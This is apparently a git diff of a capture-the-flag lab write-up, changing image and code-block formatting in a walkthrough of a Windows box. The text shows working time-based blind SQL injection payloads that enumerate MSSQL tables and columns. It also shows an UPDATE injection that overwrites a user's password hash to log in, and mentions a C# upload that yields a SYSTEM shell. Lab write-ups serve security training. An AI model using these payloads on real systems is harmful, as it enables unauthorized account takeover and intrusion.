@@ -26,17 +26,17 @@ WinRM is open, which can be used for `evil-winrm`. FTP does not accept anonymous
 
 Port 450 shows us a basic login:
 
-<figure><img src="../../../.gitbook/assets/image (1418).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1418).png>)
 
 Default credentials don't work. Attempting any form of SQL Injection shows this:
 
-<figure><img src="../../../.gitbook/assets/image (1375).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1375).png>)
 
 So this is definitely vulnerable to SQL Injection. I was unable to bypass this login, so I used `sqlmap` to verify the type of injection we needed to use.
 
-<figure><img src="../../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(667).png>)
 
-<figure><img src="../../../.gitbook/assets/image (1378).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1378).png>)
 
 All of the payloads `sqlmap` used had the `WAITFOR DELAY` commands, which means we have to exploit time-based Blind SQLI. While I could dump out the entire database (which could take hours), I wanted to exploit it manually (as per OSCP rules, no `sqlmap`!).
 
@@ -54,19 +54,15 @@ Afterwards, I enumerated some possible usernames, and found that `butch` was one
 
 Let's now identify the tables that are present within this database.
 
-{% code overflow="wrap" %}
 ```sql
 '; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--
 ```
-{% endcode %}
 
 The above payload verifies that `users` is a table within the database. Now we can check for columns.
 
-{% code overflow="wrap" %}
 ```sql
 '; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name='users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--
 ```
-{% endcode %}
 
 However, there is no `passwords` column present. In all the boxes I've done, the passwords in the databases I found were always hashed. I googled and read a bit more about the typical naming conventions and authentication mechanisms of MSSQL servers, and found this:
 
@@ -74,15 +70,12 @@ However, there is no `passwords` column present. In all the boxes I've done, the
 
 This told me that the column name might be `password_hash`, and we can vertify this using this payload:
 
-{% code overflow="wrap" %}
 ```sql
 '; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name='users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';--
 ```
-{% endcode %}
 
 Now that we have verified the existence of a `users` and `password_hash` column with a username of `butch`, we can actually update this column to have any hash we want. Right now, the hash type is unknown, so let's just try a few common hash algorithms like SHA1 and MD5.
 
-{% code overflow="wrap" %}
 ```
 $ echo hello | md5sum                                                             
 b1946ac92492d2347c6235b4d2611184
@@ -93,19 +86,16 @@ $ echo hello | sha256sum
 $ echo hello | sha512sum 
 e7c22b994c59d9cf2b48e549b1e24666636045930d3da7c1acb299d1c3b7f931f94aae41edda2c2b207a36e10f8bcb8d45223e54878f5b316e7ce3b6bc019629
 ```
-{% endcode %}
 
 I tested all of these using this payload, and then attempted to login with `butch:hello`.
 
-{% code overflow="wrap" %}
 ```sql
 '; UPDATE users SET password_hash = 'HASH' WHERE username='butch';--
 ```
-{% endcode %}
 
 We can then login to view the dashboard:
 
-<figure><img src="../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(264).png>)
 
 ### Gobuster -> C# RCE
 
@@ -130,7 +120,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /dev                  (Status: 301) [Size: 153] [--> http://192.168.208.63:450/dev/]
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1377).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1377).png>)
 
 The contents of the `site.master.txt` file was in C#:
 
@@ -245,6 +235,6 @@ namespace MyNamespaceMaster
 
 When we upload the file and refresh the page, we get a shell as the SYSTEM user.
 
-<figure><img src="../../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(666).png>)
 
 Rooted!
